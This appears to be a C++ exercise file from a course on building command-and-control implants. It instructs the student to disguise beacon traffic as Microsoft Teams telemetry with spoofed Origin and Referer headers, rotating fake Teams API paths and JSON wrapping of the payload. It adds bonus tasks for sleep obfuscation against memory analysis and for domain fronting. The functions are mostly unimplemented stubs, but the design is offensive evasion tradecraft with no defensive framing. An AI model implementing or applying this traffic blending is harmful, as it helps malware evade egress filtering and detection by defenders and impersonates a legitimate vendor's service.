/*
  Exercise 04 — C2 Malleable Profile / Traffic Blending
  -------------------------------------------------------
  A "malleable C2 profile" (Cobalt Strike concept) lets you customize
  how beacon traffic looks on the wire so it resembles legitimate SaaS/CDN
  traffic and blends through egress filters and proxy logs.

  This exercise: make your beacon look like Microsoft Teams telemetry.

  Apply these transformations:

  HEADERS to send:
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
    Origin: https://teams.microsoft.com
    Referer: https://teams.microsoft.com/v2/
    X-Ms-Client-Version: 1415/1.0.0.2024010101
    Content-Type: application/json

  URL rotation (pick one per beacon, cycle through):
    POST /v2/api/events/batch
    POST /v2/api/telemetry
    POST /v2/api/client-log

  Body wrapping — wrap your real payload in a Teams-looking JSON:
    { "events": [ { "name": "appLoaded", "time": <epoch>, "data": "<base64_payload>" } ] }

  Tasks:
  1. Implement wrapPayload(payload) → returns the Teams-wrapped JSON string.
  2. Implement unwrapResponse(body) → extracts the real C2 response from
     the server's wrapper:
     { "status": "ok", "payload": "<base64_task>" }
  3. Implement buildRequest(payload) → returns an HttpRequest struct with:
     - a randomly selected URL from the rotation list
     - all required headers
     - the wrapped body
  4. Integrate wrapPayload / unwrapResponse into ex02's httpPost.

  BONUS:
  - Implement a sleep obfuscation timer: instead of Sleep(N), use
    a high-resolution timer and a XOR-encrypted sleep counter so the
    sleep duration is not trivially detectable in memory analysis.
  - Add domain fronting: send to a CDN IP but set Host: <internal-server>.

  Compile:
    cl /std:c++17 ex04_malleable_profile.cpp /OUT:ex04.exe
*/

#include <windows.h>
#include <string>
#include <vector>
#include <cstdio>
#include <ctime>

// --- Base64 encode (same as ex03) ---
static const char* B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
std::string b64enc(const std::string& in) {
    std::string out; const BYTE* d = (const BYTE*)in.data(); size_t n = in.size(), i = 0;
    while (i+2<n){DWORD v=(d[i]<<16)|(d[i+1]<<8)|d[i+2];
        out+=B64[(v>>18)&63];out+=B64[(v>>12)&63];out+=B64[(v>>6)&63];out+=B64[v&63];i+=3;}
    if(i+1==n){DWORD v=d[i]<<16;out+=B64[(v>>18)&63];out+=B64[(v>>12)&63];out+="==";}
    else if(i+2==n){DWORD v=(d[i]<<16)|(d[i+1]<<8);out+=B64[(v>>18)&63];
        out+=B64[(v>>12)&63];out+=B64[(v>>6)&63];out+='=';}
    return out;
}

static const char* URL_POOL[] = {
    "/v2/api/events/batch",
    "/v2/api/telemetry",
    "/v2/api/client-log",
};
static int g_urlIndex = 0;

struct HttpRequest {
    std::string method;
    std::string url;
    std::vector<std::string> headers;
    std::string body;
};

// ---------- TODO 1: wrapPayload ----------
std::string wrapPayload(const std::string& payload) {
    // YOUR CODE HERE:
    // 1. base64 encode payload
    // 2. get current epoch timestamp
    // 3. build the Teams-shaped JSON:
    //    { "events": [ { "name": "appLoaded", "time": <epoch>, "data": "<b64>" } ] }
    (void)payload;
    return "{}"; // replace
}

// ---------- TODO 2: unwrapResponse ----------
std::string unwrapResponse(const std::string& body) {
    // YOUR CODE HERE:
    // Extract "payload" field from { "status":"ok", "payload":"<b64>" }
    // base64 decode it and return the real task JSON
    // If no payload field, return ""
    (void)body;
    return ""; // replace
}

// ---------- TODO 3: buildRequest ----------
HttpRequest buildRequest(const std::string& payload) {
    HttpRequest r;
    r.method = "POST";

    // TODO: pick next URL from URL_POOL (cycle with g_urlIndex)
    r.url = URL_POOL[0]; // replace

    // TODO: add all required headers to r.headers
    r.headers = {
        // "User-Agent: Mozilla/5.0 ...",
        // "Origin: https://teams.microsoft.com",
        // "Referer: https://teams.microsoft.com/v2/",
        // "X-Ms-Client-Version: 1415/1.0.0.2024010101",
        // "Content-Type: application/json",
    };

    r.body = wrapPayload(payload);
    return r;
}

int main() {
    std::string testPayload = R"({"agentId":"abc","hostname":"WIN10","username":"user","os":"win"})";

    std::string wrapped = wrapPayload(testPayload);
    printf("[*] Wrapped payload:\n%s\n\n", wrapped.c_str());

    HttpRequest req = buildRequest(testPayload);
    printf("[*] Request URL: %s\n", req.url.c_str());
    printf("[*] Headers:\n");
    for (auto& h : req.headers) printf("    %s\n", h.c_str());
    printf("[*] Body (first 100 chars): %.100s\n", req.body.c_str());

    std::string fakeResp = R"({"status":"ok","payload":"dGVzdA=="})";
    std::string unwrapped = unwrapResponse(fakeResp);
    printf("[*] Unwrapped response: '%s' (expected: 'test')\n", unwrapped.c_str());

    return 0;
}
